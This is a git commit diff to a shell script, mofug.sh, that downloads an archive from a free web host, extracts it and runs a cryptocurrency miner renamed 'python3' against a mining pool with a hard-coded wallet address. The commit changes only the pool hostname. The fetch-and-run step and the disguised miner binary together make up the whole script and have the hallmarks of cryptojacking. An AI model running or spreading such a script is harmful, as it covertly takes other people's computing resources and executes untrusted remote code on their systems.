21feaa9783062b792692122bdeede7044889a1aa
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-07-13 12:53:04 +0700

    Update mofug.sh

--- mofug.sh
+++ mofug.sh
@@ -2,4 +2,4 @@ wget -O DOT momok.x10.bz/DOT-CPU.tar.gz
 
 tar -xvf DOT
 
-./dotcpu/python3 -a yespowersugar -o stratum.mofumofu.me:3391 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz
+./dotcpu/python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz
